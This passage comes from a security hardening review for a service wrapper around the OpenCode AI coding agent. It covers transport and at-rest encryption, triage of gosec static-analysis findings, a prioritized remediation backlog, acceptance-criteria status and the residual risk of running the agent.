- Add credential rotation guidance, age warnings, or an optional rotation policy.
- Keep the child process environment filtered by default.
- Document incident response steps for leaked server passwords.
- Keep secret scanning in CI and pre-release checks.

## Encryption in Transit Review

Current state:

- Internal OpenCode traffic is plain HTTP.
- Default bind and advertised access are loopback HTTP.
- Non-loopback HTTP advertised URLs are refused by default unless `--allow-insecure-remote-http` is explicitly set.
- HTTPS advertised URLs are supported for reverse proxies and tunnels.
- Tailscale Serve/Funnel exposure keeps OpenCode bound to loopback and advertises HTTPS URLs.
- Authentication remains Basic Auth between client/proxy and OpenCode unless a proxy adds stronger identity controls.

Required target state:

- Loopback-only HTTP between OpenCode and local proxy is acceptable.
- Any remote client path must use HTTPS/TLS.
- Prefer mTLS or identity-aware proxy controls for enterprise/trusted-client use.
- Continue distinguishing internal bind URL from externally advertised HTTPS URL in CLI/status output.

## Encryption at Rest Review

Current state:

- Agent config/state/log files use restrictive filesystem permissions.
- Agent logs rotate and apply broader secret redaction.
- Credentials are stored in OS keychain.
- OpenCode's own provider credentials and session databases are outside this repository's direct control, but the hardening guide notes they may be plaintext protected primarily by permissions.

Required target state:

- Continue using OS keychain for agent credentials.
- Keep `0600`/`0700` defaults.
- Add warnings when OpenCode auth/config/database files are group/world readable.
- Consider integrating a health check or status warning based on the hardening reference.
- Treat logs and state as sensitive operational data.

## `gosec` Triage

The original `gosec` run reported 8 issues. These were reviewed and remediated or annotated with explicit safety invariants. Re-test on 2026-04-24 with `go run github.com/securego/gosec/v2/cmd/gosec@v2.23.0 ./...` reported 0 issues.

| Rule | Location | CWE | Triage |
| --- | --- | --- | --- |
| G703 path traversal via taint | `service.CopyExecutable` temp write | CWE-22 | Mostly false positive because destination is under agent state root; still validate state root overrides and avoid following unsafe symlinks. |
| G204 subprocess launched with variable | `supervisor.BuildCommand` | CWE-78 | Design-intent but security-sensitive; `OpenCodeBinary` is config-derived. Prefer absolute path validation and install-time warnings. |
| G204 subprocess launched with variable | `service.RunCommands` | CWE-78 | Lower risk because commands are generated internally, but keep command construction closed over known binaries. |
| G204 subprocess launched with variable | Windows `schtasks` query | CWE-78 | Lower risk due to normalized service name, but retain tests for name validation. |
| G304 file inclusion | `service.CopyExecutable` source read | CWE-22 | Design-intent to copy current executable; validate source is current executable or explicit trusted path. |
| G304 file inclusion | `instance.LogTail` | CWE-22 | Lower risk because path comes from normalized instance paths; keep paths internal and avoid exposing arbitrary log reads. |
| G117 marshaled secret field | `keychain.Store` | CWE-499 | Acceptable only because blob is stored in OS keychain; document and add no-log guarantees. |
| G306 `0755` write | copied executable | CWE-276 | Expected for executable binary; ensure containing directory is `0700` and avoid world-writable parent directories. |

Recommended CI posture:

- Keep `gosec` in CI.
- Keep `#nosec` annotations narrow and paired with comments/tests that prove the safety invariant.
- Keep the report's accepted-risk rationale in the repository.

## Prioritized Remaining Backlog

### P0: Required Before Any Open-Internet Exposure

- Do not expose raw OpenCode HTTP directly to the internet.
- Use HTTPS/TLS termination through Cloudflare Tunnel, Tailscale, Nginx/Caddy, or an enterprise proxy.
- Keep `0.0.0.0` bind fallback behind explicit operator opt-in.
- Require strong proxy-level access control for public tunnel URLs.

### P1: Remaining High Priority Refactors

- Replace environment-variable password handoff if upstream OpenCode supports a safer secret transport.
- Add per-client identity, revocation, and rate limiting through a proxy pattern or future upstream token support.
- Add a separate explicit hardening command to merge safe project `opencode.json` defaults after backing up the original file.
- Add credential age warnings or optional rotation policy guidance.

### P2: Defense in Depth

- Add warnings when OpenCode auth/config/database files are group/world readable.
- Add example hardened reverse proxy configs.
- Add an incident response playbook for leaked server credentials.
- Pin the CI `govulncheck@latest` install to a fixed scanner version for reproducibility.
- Consider optional encrypted-at-rest state/log storage only if the operational threat model requires same-user filesystem protection.

### P3: Operational Maturity

- Add an explicit `security doctor` or `status --security` command.
- Add optional JSON output for security posture checks.

## Acceptance Criteria Re-test Status

- Complete: New install into a workdir without `opencode.json` creates the secure default file.
- Complete: Existing `opencode.json` is never overwritten without explicit user action.
- Complete: Existing unsafe config produces visible install/status warnings.
- Complete: Remote access docs no longer imply plain HTTP is safe solely because VPN/Tailnet is present.
- Complete: Non-loopback HTTP advertised URLs are refused by default and warned about when explicitly allowed.
- Complete: Tailnet bind failure does not silently expose `0.0.0.0`; all-interface fallback requires explicit opt-in.
- Complete: Tests cover config seeding, existing config preservation, unsafe config warnings, and bind fallback behavior.
- Complete: CI includes vulnerability, static security, dependency, release integrity, and secret-scanning checks.
- Remaining: Fully remove password exposure from the child process environment.
- Remaining: Add per-client identity/revocation or require it through a first-class proxy integration for shared deployments.

## Residual Risk

Even after these remediations, OpenCode remains an AI coding agent capable of reading files, modifying files, executing commands, and interacting with external services under the user's privileges. Permission settings, Basic Auth, VPNs, and reverse proxies reduce risk but do not create a sandbox. For high-trust or regulated environments, run the service in a dedicated OS account, container, VM, or remote workspace with least-privilege filesystem access and strong network controls.
